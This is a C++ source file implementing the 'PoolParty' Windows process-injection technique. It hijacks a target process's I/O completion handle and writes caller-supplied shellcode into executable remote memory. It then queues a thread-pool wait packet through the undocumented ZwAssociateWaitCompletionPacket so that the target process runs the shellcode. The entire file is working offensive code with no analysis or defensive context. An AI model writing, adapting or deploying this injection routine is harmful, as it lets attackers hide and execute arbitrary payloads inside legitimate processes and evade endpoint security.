#include "PoolParty.h"

void Inject2Process(HANDLE hProcess, unsigned char* buffer, int buffer_size)
{
	SIZE_T dwSize;
	HANDLE hRemoteIoHandle;
	HMODULE hNtdll;
	FN_ZwAssociateWaitCompletionPacket _ZwAssociateWaitCompletionPacket;

	hNtdll = LoadLibraryA("Ntdll.dll");
	if (hNtdll == nullptr) {
		return;
	}
	_ZwAssociateWaitCompletionPacket = (FN_ZwAssociateWaitCompletionPacket)GetProcAddress(hNtdll,"ZwAssociateWaitCompletionPacket");

	if (_ZwAssociateWaitCompletionPacket == nullptr) {
		FreeLibrary(hNtdll);
		return;
	}

	hRemoteIoHandle = HijackProcessHandle(hProcess, IO_COMPLETION_ALL_ACCESS);

	const auto pShellcode = VirtualAllocEx(hProcess,nullptr,buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess,pShellcode,buffer,buffer_size,&dwSize);

	PFULL_TP_WAIT pTpWait = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)pShellcode, nullptr, nullptr);

	const auto pRemoteTpWait = static_cast<PFULL_TP_WAIT>(VirtualAllocEx(hProcess,nullptr,sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	WriteProcessMemory(hProcess, pRemoteTpWait, pTpWait, sizeof(FULL_TP_WAIT),&dwSize);

	const auto pRemoteTpDirect = static_cast<PTP_DIRECT>(VirtualAllocEx(hProcess, nullptr, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	WriteProcessMemory(hProcess, pRemoteTpDirect, &pTpWait->Direct, sizeof(TP_DIRECT),&dwSize);

	const auto p_hEvent = CreateEventW(nullptr, FALSE, FALSE, const_cast<LPWSTR>(L"F585D84E-52F7-40DE-BDAD-8E9C31900BB8"));

	_ZwAssociateWaitCompletionPacket(pTpWait->WaitPkt, hRemoteIoHandle, p_hEvent, pRemoteTpDirect, pRemoteTpWait, 0, 0, nullptr);

	SetEvent(p_hEvent);
	FreeLibrary(hNtdll);
}